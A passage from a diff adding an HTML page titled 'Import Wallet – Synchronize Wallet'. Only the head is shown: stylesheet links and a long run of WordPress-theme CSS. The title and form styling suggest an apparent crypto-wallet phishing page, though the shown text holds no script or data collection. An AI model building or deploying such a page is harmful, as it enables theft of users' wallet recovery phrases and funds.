@@ -1,0 +1,3251 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <title>Import Wallet – Synchronize Wallet</title>
+    <link rel="stylesheet" id="contact-form-7-css" href="./css/styles.css" type="text/css" media="all">
+    <style id="rs-plugin-settings-inline-css" type="text/css">
+    #rs-demo-id {}
+    </style>
+    <link rel="stylesheet" id="spb-frontend-css" href="./css/spb-styles.css" type="text/css" media="all">
+    <link rel="stylesheet" id="bootstrap-css" href="./css/bootstrap.min.css" type="text/css" media="all">
+    <link rel="stylesheet" id="sf-main-css" href="./css/main.css" type="text/css" media="all">
+    <link rel="stylesheet" href="./css/css" media="all" onload="this.media=&#39;all&#39;">
+    <style type="text/css" id="wp-custom-css">
+    /* TABS */
+    #sp-tabpro-wrapper_60.sp-tab__lay-default ul {
+        border-bottom: 1px solid #cccccc;
+        justify-content: center !important;
+    }
+
+    /* FORMS */
+    .wpcf7 .wpcf7-select {
+        height: 50px !important;
+        color: #000 !important;
+    }
+
+    .wpcf7 textarea {
+        height: 100px !important;
+    }
+
+    .wpcf7 input.wpcf7-submit[type="submit"] {
+        width: 100% !important;
+    }
+
+    input[type=submit],
+    button[type=submit],
+    input[type="file"],
+    .wpcf7 input.wpcf7-submit[type=submit],
+    .gform_wrapper input[type="submit"],
+    .gform_wrapper input[type="submit"]:hover {
+        background: #9cd7ed !important;
+    </style>
+    <style type="text/css">
+    .sf-elem-bf,
+    .sf-elem-bt,
+    .sf-elem-br,
+    .sf-elem-bb,
+    .sf-elem-bl {
+        border-color: #eaeaea;
+    }
+
+    .sf-accent-bg,
+    .funded-bar .bar {
+        background-color: #7eced5;
+    }
+
+    .sf-accent {
+        color: #7eced5;
+    }
+
+    .sf-accent-border {
+        border-color: #7eced5;
+    }
+
+    .sf-accent-hover:hover {
+        color: #7eced5;
+    }
+
+    .loved-item:hover .loved-count,
+    .flickr-widget li,
+    .portfolio-grid li,
+    figcaption .product-added,
+    .woocommerce .widget_layered_nav ul li.chosen>*,
+    .woocommerce .widget_layered_nav ul li.chosen small.count,
+    .woocommerce .widget_layered_nav_filters ul li a {
+        background-color: #7eced5;
+        color: #ffffff;
+    }
+
+    a:hover,
+    a:focus,
+    #sidebar a:hover,
+    .pagination-wrap a:hover,
+    .carousel-nav a:hover,
+    .portfolio-pagination div:hover>i,
+    #footer a:hover,
+    .beam-me-up a:hover span,
+    .portfolio-item .portfolio-item-permalink,
+    .read-more-link,
+    .blog-item .read-more,
+    .blog-item-details a:hover,
+    .author-link,
+    span.dropcap2,
+    .spb_divider.go_to_top a,
+    .item-link:hover,
+    #header-translation p a,
+    #breadcrumbs a:hover,
+    .ui-widget-content a:hover,
+    #product-img-slider li a.zoom:hover,
+    .article-body-wrap .share-links a:hover,
+    ul.member-contact li a:hover,
+    .bag-product a.remove:hover,
+    .bag-product-title a:hover,
+    #back-to-top:hover,
+    ul.member-contact li a:hover,
+    .fw-video-link-image:hover i,
+    .ajax-search-results .all-results:hover,
+    .search-result h5 a:hover .ui-state-default a:hover,
+    .fw-video-link-icon:hover,
+    .fw-video-close:hover {
+        color: #7eced5;
+    }
+
+    .carousel-wrap>a:hover {
+        color: #7eced5 !important;
+    }
+
+    .read-more i:before,
+    .read-more em:before {
+        color: #7eced5;
+    }
+
+    span.dropcap4 {
+        color: #7eced5;
+        border-color: #7eced5;
+    }
+
+    span.highlighted {
+        background-color: rgba(126, 206, 213, 0.5);
+    }
+
+    textarea:focus,
+    input:focus,
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    textarea:focus,
+    .bypostauthor .comment-wrap .comment-avatar,
+    .search-form input:focus,
+    .wpcf7 input:focus,
+    .wpcf7 textarea:focus,
+    .ginput_container input:focus,
+    .ginput_container textarea:focus,
+    .mymail-form input:focus,
+    .mymail-form textarea:focus,
+    input[type="tel"]:focus,
+    input[type="number"]:focus {
+        border-color: #7eced5 !important;
+    }
+
+    nav .menu ul li:first-child:after,
+    .navigation a:hover>.nav-text,
+    .returning-customer a:hover {
+        border-bottom-color: #7eced5;
+    }
+
+    nav .menu ul ul li:first-child:after {
+        border-right-color: #7eced5;
+    }
+
+    .spb_impact_text .spb_call_text,
+    pre[class*="language-"] {
+        border-left-color: #7eced5;
+    }
+
+    .spb_impact_text .spb_button span {
+        color: #fff;
+    }
+
+    a[rel="tooltip"],
+    ul.member-contact li a,
+    a.text-link,
+    .tags-wrap .tags a,
+    .logged-in-as a,
+    .comment-meta-actions .edit-link,
+    .comment-meta-actions .comment-reply {
+        border-color: #999;
+    }
+
+    .super-search-go {
+        border-color: #7eced5 !important;
+    }
+
+    .super-search-go:hover {
+        background: #7eced5 !important;
+        border-color: #7eced5 !important;
+    }
+
+    #one-page-nav li a:hover>i {
+        background: #7eced5;
+    }
+
+    #one-page-nav li.selected a:hover>i {
+        border-color: #7eced5;
+    }
+
+    #one-page-nav li .hover-caption {
+        background: #7eced5;
+        color: #ffffff;
+    }
+
+    #one-page-nav li .hover-caption:after {
+        border-left-color: #7eced5;
+    }
+
+    #sidebar-progress-menu ul li {
+        border-color: #eaeaea;
+    }
+
+    #sidebar-progress-menu ul li a {
+        color: #222;
+    }
+
+    #sidebar-progress-menu ul li.read a {
+        color: #999;
+    }
+
+    #sidebar-progress-menu ul li.reading a {
+        color: #7eced5;
+    }
+
+    #sidebar-progress-menu ul li.read .progress {
+        background-color: #eaeaea;
+    }
+
+    #sidebar-progress-menu ul li.reading .progress {
+        background-color: #7eced5;
+    }
+
+    body {
+        color: #222;
+    }
+
+    h1,
+    h1 a,
+    h3.countdown-subject {
+        color: #222;
+    }
+
+    h2,
+    h2 a {
+        color: #222;
+    }
+
+    h3,
+    h3 a {
+        color: #333;
+    }
+
+    h4,
+    h4 a,
+    .carousel-wrap>a {
+        color: #222;
+    }
+
+    h5,
+    h5 a {
+        color: #222;
+    }
+
+    h6,
+    h6 a {
+        color: #222;
+    }
+
+    table {
+        border-bottom-color: #eaeaea;
+    }
+
+    table td {
+        border-top-color: #eaeaea;
+    }
+
+    .read-more-button {
+        color: #7eced5;
+    }
+
+    .sf-hover-svg path {
+        stroke: #7eced5;
+    }
+
+    .player-video .player-controls {
+        border-color: #eaeaea;
+    }
+
+    .player-controls button {
+        color: #999;
+    }
+
+    .player-controls button.tab-focus,
+    .player-controls button:hover,
+    .player-progress-played[value] {
+        color: #7eced5;
+    }
+
+    .sf-headline.loading-bar .sf-words-wrapper::after,
+    .sf-headline.clip .sf-words-wrapper::after,
+    .sf-headline.type .sf-words-wrapper::after,
+    .sf-headline.type .sf-words-wrapper.selected {
+        background: #7eced5;
+    }
+
+    .sf-headline.type .sf-words-wrapper.selected b {
+        color: #ffffff;
+    }
+
+    #sf-home-preloader,
+    #site-loading {
+        background-color: #fff;
+    }
+
+    .loading-bar-transition .pace .pace-progress {
+        background-color: #7eced5;
+    }
+
+    body,
+    .layout-fullwidth #container {
+        background-color: #fff;
+    }
+
+    .inner-container-wrap,
+    #main-container .inner-container-wrap,
+    .tm-toggle-button-wrap a {
+        background-color: #fff;
+    }
+
+    .single-product.page-heading-fancy .product-main {
+        background-color: #fff;
+    }
+
+    .spb-row-container[data-top-style="slant-ltr"]:before,
+    .spb-row-container[data-top-style="slant-rtl"]:before,
+    .spb-row-container[data-bottom-style="slant-ltr"]:after,
+    .spb-row-container[data-bottom-style="slant-rtr"]:after {
+        background-color: #fff;
+    }
+
+    a,
+    .ui-widget-content a {
+        color: #999;
+    }
+
+    a:hover,
+    a:focus {
+        color: #7eced5;
+    }
+
+    ul.bar-styling li:not(.selected)>a:hover,
+    ul.bar-styling li>.comments-likes:hover {
+        color: #ffffff;
+        background: #7eced5;
+        border-color: #7eced5;
+    }
+
+    ul.bar-styling li>.comments-likes:hover * {
+        color: #ffffff !important;
+    }
+
+    ul.bar-styling li>a,
+    ul.bar-styling li>div,
+    ul.page-numbers li>a,
+    ul.page-numbers li>span,
+    .curved-bar-styling,
+    ul.bar-styling li>form input,
+    .spb_directory_filter_below {
+        border-color: #eaeaea;
+    }
+
+    ul.bar-styling li>a,
+    ul.bar-styling li>span,
+    ul.bar-styling li>div,
+    ul.bar-styling li>form input {
+        background-color: #fff;
+    }
+
+    .pagination-wrap ul li a {
+        border-color: #eaeaea !important;
+        background-color: #f7f7f7 !important;
+        color: #222 !important;
+    }
+
+    ul.page-numbers li>a:hover,
+    ul.page-numbers li>span.current,
+    .pagination-wrap ul li>a:hover,
+    .pagination-wrap ul li span {
+        border-color: #eaeaea !important;
+        background-color: #fff !important;
+        color: #222 !important;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    textarea,
+    select,
+    .wpcf7 input[type="text"],
+    .wpcf7 input[type="email"],
+    .wpcf7 textarea,
+    .wpcf7 select,
+    .ginput_container input[type="text"],
+    .ginput_container input[type="email"],
+    .ginput_container textarea,
+    .ginput_container select,
+    .mymail-form input[type="text"],
+    .mymail-form input[type="email"],
+    .mymail-form textarea,
+    .mymail-form select,
+    input[type="date"],
+    input[type="tel"],
+    input.input-text,
+    input[type="number"],
+    .select2-container .select2-choice {
+        border-color: #eaeaea;
+        background-color: #fff;
+        color: #999;
+    }
+
+    .select2-container .select2-choice>.select2-chosen {
+        color: #999 !important;
+    }
+
+    #commentform p[class^="comment-form-"]:before,
+    span.wpcf7-form-control-wrap.name:before,
+    span.wpcf7-form-control-wrap.email:before,
+    span.wpcf7-form-control-wrap.subject:before,
+    span.wpcf7-form-control-wrap.message:before {
+        color: #999;
+    }
+
+    ::-webkit-input-placeholder {
+        color: #999 !important;
+    }
+
+    :-moz-placeholder {
+        color: #999 !important;
+    }
+
+    ::-moz-placeholder {
+        color: #999 !important;
+    }
+
+    :-ms-input-placeholder {
+        color: #999 !important;
+    }
+
+    input[type=submit],
+    button[type=submit],
+    input[type="file"],
+    .wpcf7 input.wpcf7-submit[type=submit],
+    .gform_wrapper input[type="submit"],
+    .gform_wrapper input[type="submit"]:hover {
+        background: #7eced5;
+        color: #ffffff;
+    }
+
+    input[type=submit]:hover,
+    button[type=submit]:hover,
+    .wpcf7 input.wpcf7-submit[type=submit]:hover,
+    .gform_wrapper input[type=submit]:hover,
+    .mymail-form input[type=submit]:hover {
+        background: rgba(96, 176, 183, 1);
+        color: #ffffff;
+    }
+
+    .modal-header {
+        background: #f7f7f7;
+    }
+
+    .modal-content {
+        background: #fff;
+    }
+
+    .modal-header h3,
+    .modal-header .close {
+        color: #222;
+    }
+
+    .modal-header .close:hover {
+        color: #7eced5;
+    }
+
+    #account-modal .nav-tabs li.active span {
+        border-bottom-color: #7eced5;
+    }
+
+    .recent-post .post-details,
+    .portfolio-item h5.portfolio-subtitle,
+    .search-item-content time,
+    .search-item-content span,
+    .portfolio-details-wrap .date {
+        color: #222;
+    }
+
+    .select2-drop,
+    .select2-drop-active {
+        border-color: #eaeaea;
+    }
+
+    .owl-pagination .owl-page span {
+        background-color: #222;
+    }
+
+    .owl-pagination .read-more i::before {
+        color: #222;
+    }
+
+    .owl-pagination .read-more:hover i::before {
+        color: #7eced5;
+    }
+
+    .owl-pagination .owl-page:hover span,
+    .owl-pagination .owl-page.active a {
+        background-color: rgba(96, 176, 183, 1);
+    }
+
+    #top-bar {
+        background: #fff;
+        border-bottom-color: #eaeaea;
+    }
+
+    #top-bar .tb-text {
+        color: #444;
+    }
+
+    #top-bar .tb-text>a,
+    #top-bar nav .menu>li>a {
+        color: #999;
+    }
+
+    #top-bar .menu li {
+        border-left-color: #eaeaea;
+        border-right-color: #eaeaea;
+    }
+
+    #top-bar .menu>li>a,
+    #top-bar .menu>li.parent:after {
+        color: #999;
+    }
+
+    #top-bar .menu>li>a:hover,
+    #top-bar a:hover {
+        color: #7eced5;
+    }
+
+    .header-wrap #header,
+    .header-standard-overlay #header,
+    .vertical-header .header-wrap #header-section,
+    #header-section .is-sticky #header.sticky-header {
+        background-color: #9cd7ed;
+    }
+
+    .fs-search-open .header-wrap #header,
+    .fs-search-open .header-standard-overlay #header,
+    .fs-search-open .vertical-header .header-wrap #header-section,
+    .fs-search-open #header-section .is-sticky #header.sticky-header {
+        background-color: #7eced5;
+    }
+
+    .fs-supersearch-open .header-wrap #header,
+    .fs-supersearch-open .header-standard-overlay #header,
+    .fs-supersearch-open .vertical-header .header-wrap #header-section,
+    .fs-supersearch-open #header-section .is-sticky #header.sticky-header {
+        background-color: #7eced5;
+        border-bottom-color: transparent;
+    }
+
+    .overlay-menu-open .header-wrap #header,
+    .overlay-menu-open .header-standard-overlay #header,
+    .overlay-menu-open .vertical-header .header-wrap #header-section,
+    .overlay-menu-open #header-section .is-sticky #header.sticky-header {
+        background-color: #7eced5;
+        border-bottom-color: transparent;
+    }
+
+    #sf-header-banner {
+        background-color: #fff;
+        border-bottom: 2px solid#e3e3e3;
+    }
+
+    #sf-header-banner {
+        color: #222;
+    }
+
+    #sf-header-banner a {
+        color: #333;
+    }
+
+    #sf-header-banner a:hover {
+        color: #7eced5;
+    }
+
+    .header-left,
+    .header-right,
+    .vertical-menu-bottom .copyright {
+        color: #222;
+    }
+
+    .header-left a,
+    .header-right a,
+    .vertical-menu-bottom .copyright a,
+    .header-left ul.menu>li>a.header-search-link-alt,
+    .header-left ul.menu>li>a.header-search-link,
+    .header-right ul.menu>li>a.header-search-link,
+    .header-right ul.menu>li>a.header-search-link-alt {
+        color: #222;
+    }
+
+    .aux-item nav .menu>li.menu-item>a,
+    .aux-item nav.std-menu .menu>li>a,
+    .aux-item nav.std-menu .menu>li>span {
+        color: #222;
+    }
+
+    .header-left a:hover,
+    .header-right a:hover,
+    .vertical-menu-bottom .copyright a:hover {
+        color: #7eced5;
+    }
+
+    .header-left ul.menu>li:hover>a.header-search-link-alt,
+    .header-right ul.menu>li:hover>a.header-search-link-alt {
+        color: #7eced5 !important;
+    }
+
+    #header-search a:hover,
+    .super-search-close:hover {
+        color: #7eced5;
+    }
+
+    .sf-super-search {
+        background-color: rgba(96, 176, 183, 1);
+    }
+
+    .sf-super-search .search-options .ss-dropdown ul {
+        background-color: #7eced5;
+    }
+
+    .sf-super-search .search-options .ss-dropdown ul li a {
+        color: #ffffff;
+    }
+
+    .sf-super-search .search-options .ss-dropdown ul li a:hover {
+        color: rgba(96, 176, 183, 1);
+    }
+
+    .sf-super-search .search-options .ss-dropdown>span,
+    .sf-super-search .search-options input {
+        color: #7eced5;
+        border-bottom-color: #7eced5;
+    }
+
+    .sf-super-search .search-options .ss-dropdown ul li .fa-check {
+        color: rgba(96, 176, 183, 1);
+    }
+
+    .sf-super-search-go:hover,
+    .sf-super-search-close:hover {
+        background-color: #7eced5;
+        border-color: #7eced5;
+        color: #ffffff;
+    }
+
+    .header-languages .current-language {
+        color: #333;
+    }
+
+    .search-item-content time {
+        color: #f0f0f0;
+    }
+
+    .header-left .aux-item,
+    .header-right .aux-item {
+        padding-left: 5px;
+        padding-right: 5px;
+    }
+
+    .aux-item .std-menu.cart-wishlist {
+        margin-left: 0;
+        margin-right: 0;
+    }
+
+    #header-section header,
+    .header-wrap #header-section .is-sticky #header.sticky-header,
+    #main-nav {
+        border-bottom-color: #9cd7ed;
+    }
+
+    #contact-slideout {
+        background: #fff;
+    }
+
+    #mobile-top-text,
+    #mobile-header {
+        background-color: #9cd7ed;
+        border-bottom-color: #9cd7ed;
+    }
+
+    #mobile-top-text,
+    #mobile-logo h1 {
+        color: #222;
+    }
+
+    #mobile-top-text a,
+    #mobile-header a {
+        color: #222;
+    }
+
+    #mobile-header a {
+        color: #222;
+    }
+
+    #mobile-header .hamburger-inner,
+    #mobile-header .hamburger-inner::before,
+    #mobile-header .hamburger-inner::after {
+        background-color: #222;
+    }
+
+    #mobile-header .mobile-menu-link:hover .hamburger-inner,
+    #mobile-header .mobile-menu-link:hover .hamburger-inner::before,
+    #mobile-header .mobile-menu-link:hover .hamburger-inner::after {
+        background-color: #7eced5;
+    }
+
+    #mobile-header a.mobile-menu-link span.menu-bars,
+    #mobile-header a.mobile-menu-link span.menu-bars:before,
+    #mobile-header a.mobile-menu-link span.menu-bars:after {
+        background-color: #222;
+    }
+
+    #mobile-header a.mobile-menu-link:hover span.menu-bars,
+    #mobile-header a.mobile-menu-link:hover span.menu-bars:before,
+    #mobile-header a.mobile-menu-link:hover span.menu-bars:after {
+        background-color: #7eced5;
+    }
+
+    #mobile-menu-wrap,
+    #mobile-cart-wrap {
+        background-color: #fff;
+        color: #222;
+    }
+
+    .mh-overlay #mobile-menu-wrap,
+    .mh-overlay #mobile-cart-wrap {
+        background-color: transparent;
+    }
+
+    .mh-menu-show #mobile-menu-wrap,
+    .mh-cart-show #mobile-cart-wrap,
+    .mobile-menu-aux {
+        background-color: #fff;
+    }
+
+    .mobile-search-form input[type="text"] {
+        color: #222;
+        background-color: #eee;
+    }
+
+    .mobile-search-form ::-webkit-input-placeholder {
+        color: #222 !important;
+    }
+
+    .mobile-search-form :-moz-placeholder {
+        color: #222 !important;
+    }
+
+    .mobile-search-form ::-moz-placeholder {
+        color: #222 !important;
+    }
+
+    .mobile-search-form :-ms-input-placeholder {
+        color: #222 !important;
+    }
+
+    #mobile-menu-wrap a,
+    #mobile-cart-wrap a:not(.sf-button) {
+        color: #222;
+    }
+
+    #mobile-menu-wrap .shopping-bag-item a>span.num-items {
+        background-color: #222;
+        color: #fff;
+    }
+
+    #mobile-menu-wrap a:not(.sf-button):hover,
+    #mobile-cart-wrap a:not(.sf-button):hover,
+    #mobile-menu ul li.menu-item>a:hover,
+    #mobile-menu ul.alt-mobile-menu>li>a:hover {
+        color: #7eced5 !important;
+    }
+
+    #mobile-menu-wrap .bag-buttons a.wishlist-button {
+        color: #222;
+    }
+
+    #mobile-menu ul li.parent>a:after {
+        color: #222;
+    }
+
+    #mobile-cart-wrap .shopping-bag-item>a.cart-contents,
+    #mobile-cart-wrap .bag-product,
+    #mobile-cart-wrap .bag-empty {
+        border-bottom-color: #eee;
+    }
+
+    #mobile-menu ul li,
+    .mobile-cart-menu li,
+    .mobile-cart-menu .bag-header,
+    .mobile-cart-menu .bag-product,
+    .mobile-cart-menu .bag-empty {
+        border-color: #eee;
+    }
+
+    a.mobile-menu-link span,
+    a.mobile-menu-link span:before,
+    a.mobile-menu-link span:after {
+        background: #222;
+    }
+
+    a.mobile-menu-link:hover span,
+    a.mobile-menu-link:hover span:before,
+    a.mobile-menu-link:hover span:after {
+        background: #7eced5;
+    }
+
+    #mobile-cart-wrap .bag-buttons>a.bag-button {
+        color: #222 !important;
+        border-color: #222;
+    }
+
+    #mobile-cart-wrap .bag-product a.remove {
+        color: #222 !important;
+    }
+
+    #mobile-cart-wrap .bag-product a.remove:hover {
+        color: #7eced5 !important;
+    }
+
+    #logo.has-img,
+    .header-left,
+    .header-right {
+        height: 90px;
+    }
+
+    #mobile-logo {
+        max-height: 70px;
+    }
+
+    #mobile-logo.has-img img {
+        max-height: 70px;
+        width: auto !important;
+    }
+
+    .full-center #logo.has-img a>img {
+        max-height: 90px;
+    }
+
+    .browser-ie #logo {
+        width: 75px;
+    }
+
+    #logo img.retina,
+    #mobile-logo img.retina {
+        width: 75px;
+    }
+
+    #logo.has-img a {
+        padding: 20px 0;
+    }
+
+    .header-2 #logo.has-img img {
+        max-height: 70px;
+    }
+
+    #logo.has-img img {
+        max-height: 100px;
+    }
+
+    .full-center #logo.has-img a>img {
+        max-height: 100px;
+        padding: 0;
+    }
+
+    #logo.has-img a {
+        height: 90px;
+    }
+
+    .full-center #main-navigation ul.menu>li>a,
+    .full-center nav.float-alt-menu ul.menu>li>a,
+    .full-center nav>.mega-menu-wrap ul.mega-menu>li.mega-menu-item,
+    .split-menu nav>.mega-menu-wrap ul.mega-menu>li.mega-menu-item,
+    .split-menu ul.menu>li,
+    .header-1 .split-menu .no-menu,
+    #sf-full-header-search,
+    .float-menu nav>.mega-menu-wrap ul.mega-menu>li.mega-menu-item,
+    #mega-menu-wrap-main_navigation #mega-menu-main_navigation>li.mega-menu-item,
+    #mega-menu-wrap-main_navigation #mega-menu-main_navigation>li.mega-menu-item>a.mega-menu-link,
+    #mega-menu-wrap-split_nav_left #mega-menu-split_nav_left>li.mega-menu-item,
+    #mega-menu-wrap-split_nav_right #mega-menu-split_nav_right>li.mega-menu-item {
+        height: 90px;
+        line-height: 90px;
+    }
+
+    #main-nav #mega-menu-wrap-main_navigation #mega-menu-main_navigation>li.mega-menu-item,
+    #main-nav #mega-menu-wrap-main_navigation #mega-menu-main_navigation>li.mega-menu-item>a.mega-menu-link {
+        height: auto;
+        line-height: inherit;
+    }
+
+    .full-center #header,
+    .full-center .float-menu,
+    .full-center #logo.no-img,
+    .header-split .float-menu,
+    .header-1 .split-menu,
+    .header-4 .header-right {
+        height: 90px;
+    }
+
+    .full-center nav li.menu-item.sf-mega-menu>ul.sub-menu,
+    .full-center .ajax-search-wrap {
+        top: 90px !important;
+    }
+
+    .browser-ff #logo a {
+        height: 90px;
+    }
+
+    .full-center #logo {
+        max-height: 90px;
+    }
+
+    #header-sticky-wrapper {
+        height: 90px !important;
+    }
+
+    .header-6 #header .header-left,
+    .header-6 #header .header-right,
+    .header-6 #logo {
+        height: 90px;
+        line-height: 90px;
+    }
+
+    .header-6 #logo.has-img a>img {
+        padding: 0;
+    }
+
+    #mega-menu-wrap-main_navigation #mega-menu-main_navigation>li.mega-menu-item.sf-menu-item-btn>a.mega-menu-link {
+        line-height: 52px;
+    }
+
+    #main-nav,
+    .header-wrap[class*="page-header-naked"] #header-section .is-sticky #main-nav {
+        background-color: #fff;
+        border-bottom-color: #9cd7ed;
+    }
+
+    .header-divide {
+        background-color: #f0f0f0;
+    }
+
+    .show-menu {
+        background-color: rgba(96, 176, 183, 1);
+        color: #ffffff;
+    }
+
+    nav .menu .sub-menu .parent>a:after {
+        border-left-color: #07c1b6;
+    }
+
+    nav .menu ul.sub-menu,
+    nav .menu ul.mega-sub-menu,
+    li.menu-item.sf-mega-menu>ul.sub-menu>div {
+        background-color: #f9f9f9;
+    }
+
+    nav.std-menu ul.sub-menu:before {
+        border-bottom-color: #f9f9f9;
+    }
+
+    nav .menu ul.sub-menu li.menu-item,
+    nav .menu ul.mega-sub-menu li.mega-menu-item {
+        border-top-color: #f0f0f0;
+        border-top-style: solid;
+    }
+
+    nav .menu>li.menu-item>a,
+    nav.std-menu .menu>li>a,
+    nav .mega-menu li.mega-menu-item>a:not(.sf-button),
+    nav.std-menu .menu>li>span {
+        color: #414141;
+    }
+
+    #main-nav ul.menu>li,
+    #main-nav ul.menu>li:first-child,
+    #main-nav ul.menu>li:first-child,
+    .full-center nav#main-navigation ul.menu>li,
+    .full-center nav#main-navigation ul.menu>li:first-child,
+    .full-center #header nav.float-alt-menu ul.menu>li {
+        border-color: #f0f0f0;
+    }
+
+    #main-nav ul.menu>li,
+    .full-center nav#main-navigation ul.menu>li,
+    .full-center nav.float-alt-menu ul.menu>li,
+    .full-center #header nav.float-alt-menu ul.menu>li {
+        border-width: 0 !important;
+    }
+
+    .full-center nav#main-navigation ul.menu>li:first-child {
+        border-width: 0;
+        margin-left: -15px;
+    }
+
+    nav .menu>li.menu-item:hover>a,
+    nav.std-menu .menu>li:hover>a {
+        color: #7eced5;
+    }
+
+    nav .menu>li.current-menu-ancestor>a,
+    nav .menu>li.current-menu-item>a,
+    nav .menu>li.current-scroll-item>a,
+    #mega-menu-wrap-main_navigation #mega-menu-main_navigation>li.mega-menu-item.current-scroll-item>a.mega-menu-link,
+    #mobile-menu .menu ul li.current-menu-item>a,
+    nav .mega-menu>li.mega-current-menu-item>a:not(.sf-button),
+    nav .mega-menu>li.mega-current_page_item>a:not(.sf-button) {
+        color: #303030;
+    }
+
+    .aux-currency .wcml_currency_switcher.sub-menu li.wcml-active-currency {
+        color: #303030 !important;
+    }
+
+    .shopping-bag-item a>span.num-items {
+        background-color: #7eced5;
+        color: #ffffff;
+    }
+
+    .header-left ul.sub-menu>li>a:hover,
+    .header-right ul.sub-menu>li>a:hover,
+    .aux-currency .wcml_currency_switcher.sub-menu li:hover {
+        color: #7eced5;
+    }
+
+    .shopping-bag-item a>span.num-items:after {
+        border-color: #7eced5;
+    }
+
+    .page-header-naked-light .sticky-wrapper:not(.is-sticky) .shopping-bag-item:hover a>span.num-items,
+    .page-header-naked-dark .sticky-wrapper:not(.is-sticky) .shopping-bag-item:hover a>span.num-items {
+        color: #9cd7ed
+    }
+
+    .page-header-naked-light .sticky-wrapper:not(.is-sticky) .shopping-bag-item:hover a>span.num-items:after,
+    .page-header-naked-dark .sticky-wrapper:not(.is-sticky) .shopping-bag-item:hover a>span.num-items:after {
+        border-color: #7eced5;
+    }
+
+    nav .menu ul.sub-menu li.menu-item>a,
+    nav .menu ul.sub-menu li>span,
+    nav.std-menu ul.sub-menu {
+        color: #999;
+    }
+
+    .bag-buttons a.bag-button,
+    .bag-buttons a.wishlist-button {
+        color: #999 !important;
+    }
+
+    .bag-product a.remove,
+    .woocommerce .bag-product a.remove {
+        color: #999 !important;
+    }
+
+    .bag-product a.remove:hover,
+    .woocommerce .bag-product a.remove:hover {
+        color: #7eced5 !important;
+    }
+
+    nav .menu ul.sub-menu li.menu-item:hover>a,
+    nav .menu ul.mega-sub-menu li.mega-menu-item:hover>a,
+    .bag-product a.remove:hover {
+        color: #7eced5 !important;
+    }
+
+    nav .menu li.parent>a:after,
+    nav .menu li.parent>a:after:hover,
+    .ajax-search-wrap:after {
+        color: #414141;
+    }
+
+    nav .menu ul.sub-menu li.current-menu-ancestor>a,
+    nav .menu ul.sub-menu li.current-menu-item>a {
+        color: #333 !important;
+    }
+
+    #main-nav .header-right ul.menu>li,
+    .wishlist-item {
+        border-left-color: #f0f0f0;
+    }
+
+    .bag-header,
+    .bag-product,
+    .bag-empty,
+    .wishlist-empty {
+        border-color: #f0f0f0;
+    }
+
+    .bag-buttons a.checkout-button,
+    .bag-buttons a.create-account-button,
+    .woocommerce input.button.alt,
+    .woocommerce .alt-button,
+    .woocommerce button.button.alt,
+    #jckqv .cart .add_to_cart_button,
+    #jckqv .button,
+    #jckqv .cart .button,
+    .woocommerce .single_add_to_cart_button.button.alt,
+    .woocommerce button.single_add_to_cart_button.button.alt {
+        background: #7eced5;
+        color: rgba(255, 255, 255, 0.7);
+    }
+
+    .woocommerce .button.update-cart-button:hover {
+        background: #7eced5;
+        color: #ffffff;
+    }
+
+    .woocommerce input.button.alt:hover,
+    .woocommerce .alt-button:hover,
+    .woocommerce button.button.alt:hover,
+    #jckqv .cart .add_to_cart_button:hover,
+    #jckqv .cart .button:hover {
+        background: #7eced5;
+        color: #ffffff;
+    }
+
+    .shopping-bag:before,
+    nav .menu ul.sub-menu li:first-child:before {
+        border-bottom-color: #07c1b6;
+    }
+
+    .page-header-naked-light .sticky-wrapper:not(.is-sticky) a.menu-bars-link:hover span,
+    .page-header-naked-light .sticky-wrapper:not(.is-sticky) a.menu-bars-link:hover span:before,
+    .page-header-naked-light .sticky-wrapper:not(.is-sticky) a.menu-bars-link:hover span:after,
+    .page-header-naked-dark .sticky-wrapper:not(.is-sticky) a.menu-bars-link:hover span,
+    .page-header-naked-dark .sticky-wrapper:not(.is-sticky) a.menu-bars-link:hover span:before,
+    .page-header-naked-dark .sticky-wrapper:not(.is-sticky) a.menu-bars-link:hover span:after {
+        background: #7eced5;
+    }
+
+    nav.std-menu ul.sub-menu,
+    ul.mega-sub-menu {
+        font-size: 18px !important;
+    }
+
+    a.menu-bars-link span,
+    a.menu-bars-link span:before,
+    a.menu-bars-link span:after {
+        background: #222;
+    }
+
+    a.menu-bars-link:hover span,
+    a.menu-bars-link:hover span:before,
+    a.menu-bars-link:hover span:after {
+        background: #7eced5 !important;
+    }
+
+    .overlay-menu-open .header-wrap {
+        background-color: #9cd7ed;
+    }
+
+    .overlay-menu-open .header-wrap #header {
+        background-color: transparent !important;
+    }
+
+    .overlay-menu-open #logo h1,
+    .overlay-menu-open .header-left,
+    .overlay-menu-open .header-right,
+    .overlay-menu-open .header-left a,
+    .overlay-menu-open .header-right a {
+        color: #d9f0f2 !important;
+    }
+
+    #overlay-menu nav li.menu-item>a,
+    .overlay-menu-open a.menu-bars-link,
+    #overlay-menu .fs-overlay-close,
+    .sf-pushnav-menu nav li.menu-item>a,
+    .sf-pushnav-menu nav ul.sub-menu li.menu-item>a,
+    .sf-pushnav a {
+        color: #d9f0f2;
+    }
+
+    .overlay-menu-open a.menu-bars-link span:before,
+    .overlay-menu-open a.menu-bars-link span:after {
+        background: #d9f0f2 !important;
+    }
+
+    .fs-supersearch-open .fs-supersearch-link,
+    .fs-search-open .fs-header-search-link {
+        color: #d9f0f2 !important;
+    }
+
+    #overlay-menu,
+    .sf-pushnav {
+        background-color: #7eced5;
+    }
+
+    #overlay-menu,
+    .sf-pushnav #fullscreen-search,
+    #fullscreen-supersearch {
+        background-color: rgba(126, 206, 213, 0.95);
+    }
+
+    #overlay-menu nav li.menu-item:hover>a,
+    .sf-pushnav-menu nav li.menu-item:hover>a,
+    .sf-pushnav-menu nav ul.sub-menu li.menu-item:hover>a,
+    .sf-pushnav a:hover {
+        color: #fff !important;
+    }
+
+    #fullscreen-supersearch .sf-super-search {
+        color: #c5e7eb !important;
+    }
+
+    #fullscreen-supersearch .sf-super-search .search-options .ss-dropdown>span,
+    #fullscreen-supersearch .sf-super-search .search-options input {
+        color: #d9f0f2 !important;
+    }
+
+    #fullscreen-supersearch .sf-super-search .search-options .ss-dropdown>span:hover,
+    #fullscreen-supersearch .sf-super-search .search-options input:hover {
+        color: #fff !important;
+    }
+
+    #fullscreen-supersearch .sf-super-search .search-go a.sf-button {
+        background-color: #7eced5 !important;
+    }
+
